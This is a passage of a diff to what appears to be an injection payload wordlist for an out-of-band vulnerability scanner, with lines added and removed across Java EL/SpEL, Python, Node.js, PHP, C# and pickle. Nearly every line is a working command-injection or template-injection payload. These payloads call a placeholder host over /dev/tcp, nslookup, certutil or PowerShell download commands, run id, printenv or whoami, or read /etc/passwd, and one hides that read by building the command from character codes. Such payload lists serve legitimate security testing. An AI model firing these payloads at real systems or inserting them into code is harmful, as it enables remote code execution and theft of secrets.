+#{\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder[\\\"(java.lang.String[])\\\"]([\\\"\/bin\/sh\\\",\\\"-c\\\",\\\"nslookup {domain}\\\"]).start()\")}
+#{''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval('new java.lang.ProcessBuilder[\\'(java.lang.String[])\\']([\\'\/bin\/sh\\',\\'-c\\',\\'nslookup {domain}\\']).start()')}
+${\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder[\\\"(java.lang.String[])\\\"]([\\\"\/bin\/sh\\\",\\\"-c\\\",\\\"nslookup {domain}\\\"]).start()\")}
+${''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval('new java.lang.ProcessBuilder[\\'(java.lang.String[])\\']([\\'\/bin\/sh\\',\\'-c\\',\\'nslookup {domain}\\']).start()')}
 Runtime.getRuntime().exec('\/bin\/bash -c \"true > \/dev\/tcp\/{domain}\/80\"');
 Runtime.getRuntime().exec('\/bin\/sh -c \"true > \/dev\/tcp\/{domain}\/80\"');
 Runtime.getRuntime().exec('certutil -urlcache -f \"http:\/\/{domain}\"');
@@ -652,78 +985,6 @@ T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec
 T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('powershell -c (New-Object Net.WebClient).DownloadString(\\\"http:\/\/{domain}\\\")').getInputStream())
 T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('powershell -c Invoke-WebRequest \\\"http:\/\/{domain}\\\"').getInputStream())
 T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())
-__import__(\u2018os\u2019).system('id')
-__import__(\u2018os\u2019).system('printenv')
-__import__(\u2018os\u2019).system('sleep 9')
-__import__(\u2018os\u2019).system(\u2018\/bin\/bash -c \"true > \/dev\/tcp\/{domain}\/80\"\u2019)
-__import__(\u2018os\u2019).system(\u2018\/bin\/sh -c \"true > \/dev\/tcp\/{domain}\/80\"\u2019)
-__import__(\u2018os\u2019).system(\u2018certutil -urlcache -f 'http:\/\/{domain}'\u2019)
-__import__(\u2018os\u2019).system(\u2018exec 6< \/dev\/tcp\/{domain}\/80\u2019)
-__import__(\u2018os\u2019).system(\u2018ping {domain} -c 2\u2019)
-__import__(\u2018os\u2019).system(\u2018powershell -c (New-Object Net.WebClient).DownloadString('http:\/\/{domain}')\u2019)
-__import__(\u2018os\u2019).system(\u2018powershell -c Invoke-WebRequest 'http:\/\/{domain}'\u2019)
-`ping {domain}`
-`printenv \/`
-child_process.exec(`\/bin\/bash -c \"true > \/dev\/tcp\/{domain}\/80\"`);
-child_process.exec(`\/bin\/sh -c \"true > \/dev\/tcp\/{domain}\/80\"`);
-child_process.exec(`certutil -urlcache -f 'http:\/\/{domain}'`);
-child_process.exec(`exec 6< \/dev\/tcp\/{domain}\/80`);
-child_process.exec(`id`);
-child_process.exec(`ping {domain} -c 2`);
-child_process.exec(`powershell -c (New-Object Net.WebClient).DownloadString('http:\/\/{domain}')`);
-child_process.exec(`powershell -c Invoke-WebRequest 'http:\/\/{domain}'`);
-child_process.exec(`printenv`);
-child_process.exec(`sleep 9`);
-child_process.execSync(`\/bin\/bash -c \"true > \/dev\/tcp\/{domain}\/80\"`);
-child_process.execSync(`\/bin\/sh -c \"true > \/dev\/tcp\/{domain}\/80\"`);
-child_process.execSync(`certutil -urlcache -f 'http:\/\/{domain}'`);
-child_process.execSync(`exec 6< \/dev\/tcp\/{domain}\/80`);
-child_process.execSync(`id`);
-child_process.execSync(`ping {domain} -c 2`);
-child_process.execSync(`powershell -c (New-Object Net.WebClient).DownloadString('http:\/\/{domain}')`);
-child_process.execSync(`powershell -c Invoke-WebRequest 'http:\/\/{domain}'`);
-child_process.execSync(`printenv`);
-child_process.execSync(`sleep 9`);
-require('child_process').execSync(`\/bin\/bash -c \"true > \/dev\/tcp\/{domain}\/80\"`).toString());
-require('child_process').execSync(`\/bin\/sh -c \"true > \/dev\/tcp\/{domain}\/80\"`).toString());
-require('child_process').execSync(`certutil -urlcache -f 'http:\/\/{domain}'`).toString());
-require('child_process').execSync(`exec 6< \/dev\/tcp\/{domain}\/80`).toString());
-require('child_process').execSync(`id`).toString());
-require('child_process').execSync(`ping {domain} -c 2`).toString());
-require('child_process').execSync(`powershell -c (New-Object Net.WebClient).DownloadString('http:\/\/{domain}')`).toString());
-require('child_process').execSync(`powershell -c Invoke-WebRequest 'http:\/\/{domain}'`).toString());
-require('child_process').execSync(`printenv`).toString());
-require('child_process').execSync(`sleep 9`).toString());
-cos%0Asystem%0A(S%27curl%20{domain}%27%0AtR.%0A
-cos%0Asystem%0A(S%27hostname%27%0AtR.%0A
-cos%0Asystem%0A(S%27ping%20-c%205%20127.0.0.1%27%0AtR.%0A
-cos%0Asystem%0A(S%27ping%20-c%205%20{domain}%27%0AtR.%0A
-cos%0Asystem%0A(S%27whoami%27%0AtR.%0A
-escapeshellcmd('\/bin\/bash -c \"true > \/dev\/tcp\/{domain}\/80\"')
-escapeshellcmd('\/bin\/sh -c \"true > \/dev\/tcp\/{domain}\/80\"')
-escapeshellcmd('certutil -urlcache -f \"http:\/\/{domain}\"')
-escapeshellcmd('exec 6< \/dev\/tcp\/{domain}\/80')
-escapeshellcmd('id')
-escapeshellcmd('ping {domain} -c 2')
-escapeshellcmd('powershell -c (New-Object Net.WebClient).DownloadString(\\\"http:\/\/{domain}\\\")')
-escapeshellcmd('powershell -c Invoke-WebRequest \\\"http:\/\/{domain}\\\"')
-escapeshellcmd('printenv')
-escapeshellcmd('sleep 9')
-eval(\"puts 'hello world'\")
-eval(1337*1337)
-eval(7*7)
-eval(compile('for x in range(1):\\n import time\\n time.sleep(20)','a','single'))
-exec('\/bin\/bash -c \"true > \/dev\/tcp\/{domain}\/80\"')
-exec('\/bin\/sh -c \"true > \/dev\/tcp\/{domain}\/80\"')
-exec('certutil -urlcache -f \"http:\/\/{domain}\"')
-exec('exec 6< \/dev\/tcp\/{domain}\/80')
-exec('id')
-exec('ping {domain} -c 2')
-exec('powershell -c (New-Object Net.WebClient).DownloadString(\\\"http:\/\/{domain}\\\")')
-exec('powershell -c Invoke-WebRequest \\\"http:\/\/{domain}\\\"')
-exec('printenv')
-exec('sleep 9')
-exit(1)
 java.lang.Runtime.exec('\/bin\/bash -c \"true > \/dev\/tcp\/{domain}\/80\");
 java.lang.Runtime.exec('\/bin\/sh -c \"true > \/dev\/tcp\/{domain}\/80\");
 java.lang.Runtime.exec('certutil -urlcache -f \"http:\/\/{domain}\"');
@@ -733,69 +994,7 @@ java.lang.Runtime.exec('ping {domain} -c 2);
 java.lang.Runtime.exec('powershell -c (New-Object Net.WebClient).DownloadString('http:\/\/{domain}'));
 java.lang.Runtime.exec('powershell -c Invoke-WebRequest 'http:\/\/{domain}');
 java.lang.Runtime.exec('printenv');
-java.lang.Runtime.exec('sleep');
-new System.Diagnostics.ProcessStartInfo(\"\/bin\/bash -c 'true > \/dev\/tcp\/{domain}\/80'\");
-new System.Diagnostics.ProcessStartInfo(\"\/bin\/sh -c 'true > \/dev\/tcp\/{domain}\/80'\");
-new System.Diagnostics.ProcessStartInfo(\"certutil -urlcache -f 'http:\/\/{domain}'\");
-new System.Diagnostics.ProcessStartInfo(\"exec 6< \/dev\/tcp\/{domain}\/80\");
-new System.Diagnostics.ProcessStartInfo(\"ping {domain}\");
-new System.Diagnostics.ProcessStartInfo(\"powershell -c (New-Object Net.WebClient).DownloadString('http:\/\/{domain}')\");
-new System.Diagnostics.ProcessStartInfo(\"powershell -c Invoke-WebRequest 'http:\/\/{domain}'\");
-new System.Diagnostics.ProcessStartInfo(\"timeout 9\");
-new System.Diagnostics.ProcessStartInfo(\"whoami\");
-os.system('\/bin\/bash -c \"true > \/dev\/tcp\/{domain}\/80\"')
-os.system('\/bin\/sh -c \"true > \/dev\/tcp\/{domain}\/80\"')
-os.system('certutil -urlcache -f \"http:\/\/{domain}\"')
-os.system('exec 6< \/dev\/tcp\/{domain}\/80')
-os.system('id')
-os.system('ping {domain} -c 2')
-os.system('powershell -c (New-Object Net.WebClient).DownloadString(\\\"http:\/\/{domain}\\\")')
-os.system('powershell -c Invoke-WebRequest \\\"http:\/\/{domain}\\\"')
-os.system('printenv')
-os.system('sleep 9')
-phpinfo()
-root.process.mainModule.require('child_process').spawnSync('cat', ['\/etc\/passwd']).stdout
-root.process.mainModule.require('child_process').spawnSync('ping', ['{domain}']).stdout
-shell_exec('\/bin\/bash -c \"true > \/dev\/tcp\/{domain}\/80\"')
-shell_exec('\/bin\/sh -c \"true > \/dev\/tcp\/{domain}\/80\"')
-shell_exec('certutil -urlcache -f \"http:\/\/{domain}\"')
-shell_exec('exec 6< \/dev\/tcp\/{domain}\/80')
-shell_exec('id')
-shell_exec('ping {domain} -c 2')
-shell_exec('powershell -c (New-Object Net.WebClient).DownloadString(\\\"http:\/\/{domain}\\\")')
-shell_exec('powershell -c Invoke-WebRequest \\\"http:\/\/{domain}\\\"')
-shell_exec('printenv')
-shell_exec('sleep 9')
-subprocess.Popen('\/bin\/bash -c \"true > \/dev\/tcp\/{domain}\/80\"', shell=True)
-subprocess.Popen('\/bin\/sh -c \"true > \/dev\/tcp\/{domain}\/80\"', shell=True)
-subprocess.Popen('certutil -urlcache -f \"http:\/\/{domain}\", shell=True)
-subprocess.Popen('exec 6< \/dev\/tcp\/{domain}\/80', shell=True)
-subprocess.Popen('id', shell=True)
-subprocess.Popen('ping {domain} -c 2', shell=True)
-subprocess.Popen('powershell -c (New-Object Net.WebClient).DownloadString(\\\"http:\/\/{domain}\\\")', shell=True)
-subprocess.Popen('powershell -c Invoke-WebRequest \\\"http:\/\/{domain}\\\"', shell=True)
-subprocess.Popen('printenv', shell=True)
-subprocess.Popen('sleep 9', shell=True)
-subprocess.check_output('\/bin\/bash -c \"true > \/dev\/tcp\/{domain}\/80\"', shell=True)
-subprocess.check_output('\/bin\/sh -c \"true > \/dev\/tcp\/{domain}\/80\"', shell=True)
-subprocess.check_output('certutil -urlcache -f \"http:\/\/{domain}\", shell=True)
-subprocess.check_output('exec 6< \/dev\/tcp\/{domain}\/80', shell=True)
-subprocess.check_output('id', shell=True)
-subprocess.check_output('ping {domain} -c 2', shell=True)
-subprocess.check_output('powershell -c (New-Object Net.WebClient).DownloadString(\\\"http:\/\/{domain}\\\")', shell=True)
-subprocess.check_output('powershell -c Invoke-WebRequest \\\"http:\/\/{domain}\\\"', shell=True)
-subprocess.check_output('printenv', shell=True)
-subprocess.check_output('sleep 9', shell=True)
-system('\/bin\/bash -c \"true > \/dev\/tcp\/{domain}\/80\"')
-system('\/bin\/sh -c \"true > \/dev\/tcp\/{domain}\/80\"')
-system('certutil -urlcache -f \"http:\/\/{domain}\"')
-system('exec 6< \/dev\/tcp\/{domain}\/80')
-system('id')
-system('ping {domain} -c 2')
-system('powershell -c (New-Object Net.WebClient).DownloadString(\\\"http:\/\/{domain}\\\")')
-system('powershell -c Invoke-WebRequest \\\"http:\/\/{domain}\\\"')
-system('printenv')
-system('sleep 9')
+java.lang.Runtime.exec('sleep 9');
 }#{\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder[\\\"(java.lang.String[])\\\"]([\\\"\/bin\/sh\\\",\\\"-c\\\",\\\"nslookup {domain}\\\"]).start()\")}#{
 }#{''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval('new java.lang.ProcessBuilder[\\'(java.lang.String[])\\']([\\'\/bin\/sh\\',\\'-c\\',\\'nslookup {domain}\\']).start()')}#{
 }${\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder[\\\"(java.lang.String[])\\\"]([\\\"\/bin\/sh\\\",\\\"-c\\\",\\\"nslookup {domain}\\\"]).start()\")}${
